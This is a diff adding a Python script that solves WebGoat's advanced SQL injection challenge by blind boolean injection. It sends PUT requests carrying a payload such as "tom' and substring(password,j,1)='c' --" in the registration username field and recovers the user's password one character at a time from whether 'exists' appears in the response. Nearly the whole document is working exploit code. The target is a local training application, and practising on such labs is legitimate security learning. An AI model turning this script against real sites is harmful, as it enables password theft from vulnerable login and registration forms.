@@ -1,0 +1,20 @@
+#!/usr/bin/python
+
+import re
+import requests
+import string
+
+url="http://127.0.0.1:8080/WebGoat/SqlInjectionAdvanced/challenge"
+proxy={"http":"127.0.0.1:8888"}
+cookies={'JSESSIONID':'5XGOrsnyVYnFJWKvLo2M0yGoJ6bzIVka0UQokmXo'}
+for j in range(1,30):
+    for i in string.ascii_lowercase+string.ascii_uppercase+string.digits:
+        username_reg="tom' and substring(password,"+str(j)+",1) ='"+str(i)+"' --"
+        post_body={'username_reg':username_reg,'email_reg':'a@a.com','password_reg':'aa','confirm_password_reg':'aa'}
+#        print("checking "+str(j)+"th letter of password and assuming the length of password to be 29 characters")
+        n=requests.put(url,cookies=cookies,proxies=proxy,data=post_body)
+        mtch=re.search("exists",n.text)
+        if mtch:
+            print(str(j)+"th letter of password is "+str(i))
+            break
+        
